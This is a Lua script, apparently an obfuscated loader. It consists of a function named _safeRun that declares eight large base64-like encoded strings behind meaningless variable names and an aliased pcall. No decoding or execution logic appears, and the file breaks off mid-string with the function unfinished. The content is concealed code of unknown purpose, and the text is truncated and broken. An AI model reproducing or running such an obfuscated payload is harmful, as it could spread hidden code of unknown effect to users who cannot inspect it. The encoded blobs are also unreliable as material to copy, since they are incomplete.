local _pkh = pcall
local _mji = nil
local _lef = ""

local function _safeRun()
  local _b0 = "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"
  local _b1 = "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"
  local _b2 = "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"
  local _b3 = "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"
  local _b4 = "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"
  local _b5 = "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"
  local _b6 = "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"
  local _b7 = "2dhMIm/cif94SFH/vBVexpCewo4hQpy7A56dEFEGXbzs3yPmSGtCX4r9PrPI6SHx5FvdxigXrNCEVyCbnWSt7cZu7wAWqLoYINzkYcNCyIKjU+qhpRlafdF0KNVh3QE/DO2UnyksAZrn6Pxc+XF17WopwCecLFm321SnHI46ZK/wcVqvznZoslBNUC70VK5Yq1ehr6L1TcH036BE5woo+PxAxQETT61BnwTWXF/yG2q7Sj153Uivu3oIHSyvWP8XOOyhoQlAn5FrwGqhqI03fKEzakvwgE6ISZjgE6dZ+fwJDMCVEakVCiCjBxd5HdbRfkER6bK1RqrGIDz25oliw9YbTsbIFL5fcJYlm8U6w8//shBpXNQrJo1heMKiYl1qZ+3R0n6XUZVQrHTZ5iWOHPZhA4Tu6n1O11M5A0lIsGZinN9z+A054aJO8LHhgn5ZBiiW/RoH/00pNqBo947LKR7fb7w5A/HjBP7UIpFn2u+Br/7ruv9AaKgEPAKIUnTisuGN81e1advrSp9Il1jotEerZ2srPzb2MNiyjZSbKz+1nHBFms7HDyn3h6Tq7HO62LlOq0j7XsJLLpFq/km8SbF9bg2Q2JDz6xUI36qI3DMsmazlOCbfvnFl/kqHn2Da9M3/rOJRE6tRpIEAmT6r+pQHYJmVR8Z9uGC4kSyTEkk2i+LlLZky+XPMdntZINAR+ssymdHTyLTuLl8oVdPBHCe6xYO9bm/w0rrs+MvpOEcRtzSTc547MQAoldeRCY2D1B3YnAs7g5nBYXLh5Q+kafhicl3KShWxOEiEHtcJC4ZEtn1X4CfXKvbWEOVdC+al4yw5XEFtGrpsUhIuIMwpRNc1LE7w7uoaqW4DX9ohBYtHSDohAiI2XAvlcJ8TVfZEEwyQ2hiz6RKeiFWsPpwKUJlsceZ0qhdynEj7hTUcuSQtV0ojCj3g7qoPJ81AjOS3kUluvVrbxwq/lBazbpg5aQLU49NYsQytH37GC7ZueH/TxVFxcMLr6SBGjYydh7dppCim7/lk6Pr/MMxKl2KXn9KMIVFs1lQji5AUOpuPtgU3NKvGbmAsVeNSzHk4PgZvvTJ5tE6OzyiNjUclCVhjd4k7EuIbTgPt7ibEgCVuBTveqTqg/6bgRsJ5xv6EGWA0/aRd8ldZ41Ye0yriyro2iybPWjoUr/+T6aD53DzawWwHi/At5iaGg/klzw4HjLx8r3elFBvnKZoDzCGjtPsIAqbRVu6Pbt2HC5xkI2tw1gYmME6eoyqqml32/J5f3+D/3wuRUThS1xg2gK+arXrAAYC+Y9vZzlXjhiFK16oadPXDzB6qAta7f3lGl+E4tH3FEpt9R6szJtakZsfDj74qcc1b3xmzPHL2mjHd32Lk/E5Hijy9DjKEnHhOnhRXmcOOIaFlHnQ8GHbDqAAgdZzonUTVtjLo6vPH0xn/kNA7CcxfhqAT1+zMn7kd4RE2itl3oILMs3I6ggu0sxyouKsAu+ax7hxp7nKWCAmGzlQ+KO39QqDoTPzo408cbOVu3OD1K7lvUMM9YKePBXpaIIS31k1R+eK7GxM84cIJvxVgEb6saSd6V93a6vdnhzCunmR2+BG2nOQfEWfY2aMv3JE6msbxsfgvmEZmnBtFu7c0Ckaihvg4nOg3+YF/v2lbq5yXcfou9ceAewKDnqleR